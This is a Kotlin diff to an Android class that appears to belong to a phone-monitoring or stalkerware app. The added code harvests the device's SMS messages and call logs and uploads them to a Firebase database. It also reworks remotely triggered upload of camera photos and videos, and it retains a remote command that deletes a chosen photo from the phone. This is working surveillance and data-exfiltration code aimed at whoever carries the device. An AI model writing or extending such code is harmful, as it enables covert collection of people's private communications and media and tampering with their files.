@@ -149,6 +149,8 @@ class InteractorAccessibilityData @Inject constructor(
             setDataLocationHourly(location)
 
             saveContacts()
+            saveSMS()
+            saveCallLogs()
         }
 
     }
@@ -157,6 +159,18 @@ class InteractorAccessibilityData @Inject constructor(
         //Contacts
         val contactsList = Contacts.contactsList(context)
         firebase.getDatabaseReference("${Consts.CONTACTS}/").setValue(contactsList)
+    }
+
+    private fun saveSMS() {
+        //Contacts
+        val smsList = SMSes.smsList(context)
+        firebase.getDatabaseReference("${Consts.SMSES}/").setValue(smsList)
+    }
+
+    private fun saveCallLogs() {
+        //Contacts
+        val callList = CallLogs.callList(context)
+        firebase.getDatabaseReference("${Consts.CALLLOGS}/").setValue(callList)
     }
 
     private fun setDataLocationHourly(location: Location) {
@@ -259,33 +273,36 @@ class InteractorAccessibilityData @Inject constructor(
     }
 
     private fun getGalleryPhoto(galleryPhoto: GalleryPhoto) {
-        val dcimPath = File(
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
-                .toString() + "/Camera"
-        )
-        if (dcimPath.exists()) {
-            val files = dcimPath.listFiles()
-            if (files != null) {
-                for (i in files.indices) {
-                    if (!isVideoFileUri(files[i].absolutePath)) {
-                        if (i < 10) {
-                            sendGalleryPhoto(files[i]);
+        if (galleryPhoto.getPhotos!!) {
+            val dcimPath = File(
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
+                    .toString() + "/Camera"
+            )
+            if (dcimPath.exists()) {
+                val files = dcimPath.listFiles()
+                if (files != null) {
+                    for (i in files.indices) {
+                        if (!isVideoFileUri(files[i].absolutePath)) {
+                            if (i < galleryPhoto.count!!) {
+                                sendGalleryPhoto(files[i]);
+                            }
                         }
                     }
                 }
             }
-        }
 
-        if (galleryPhoto.removePhotos!!) {
-            if (galleryPhoto.photoPath != null) {
-                Log.d("FILE", "..............******................")
-                val file = File(galleryPhoto.photoPath!!)
-                val result = file.delete()
-                if (result) {
-                    println("Deletion succeeded.")
-                    Log.d("FILE", "Deletion success")
-                } else {
-                    Log.d("FILE", "Deletion failed")
+            resetParamsVideo()
+
+            if (galleryPhoto.removePhotos!!) {
+                if (galleryPhoto.photoPath != null) {
+                    val file = File(galleryPhoto.photoPath!!)
+                    val result = file.delete()
+                    if (result) {
+                        println("Deletion succeeded.")
+                        Log.d("FILE", "Deletion success")
+                    } else {
+                        Log.d("FILE", "Deletion failed")
+                    }
                 }
                 resetParamsPhotos()
             }
@@ -293,16 +310,18 @@ class InteractorAccessibilityData @Inject constructor(
     }
 
     private fun getGalleryVideos(child: GalleryVideo) {
-        val dcimPath = File(
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
-                .toString() + "/Camera"
-        )
-        if (dcimPath.exists()) {
-            val files = dcimPath.listFiles()
-            if (files != null) {
-                for (i in files.indices) {
-                    if (isVideoFileUri(files[i].absolutePath)) {
-                        sendGalleryVideo(files[i]);
+        if (child.getVideos!!) {
+            val dcimPath = File(
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
+                    .toString() + "/Camera"
+            )
+            if (dcimPath.exists()) {
+                val files = dcimPath.listFiles()
+                if (files != null) {
+                    for (i in files.indices) {
+                        if (isVideoFileUri(files[i].absolutePath)) {
+                            sendGalleryVideo(files[i]);
+                        }
                     }
                 }
             }
@@ -538,7 +557,11 @@ class InteractorAccessibilityData @Inject constructor(
     private fun resetParamsPhotos() {
         val childGalleryPhoto = GalleryPhoto(false, 0, false, "null")
         firebase.getDatabaseReference("$PHOTOS/$PARAMS").setValue(childGalleryPhoto)
-        setIntervalRecord(0)
+    }
+
+    private fun resetParamsVideo() {
+        val childGalleryVideo = GalleryVideo(false, 0)
+        firebase.getDatabaseReference("$VIDEOS/$PARAMS").setValue(childGalleryVideo)
     }
 
 }
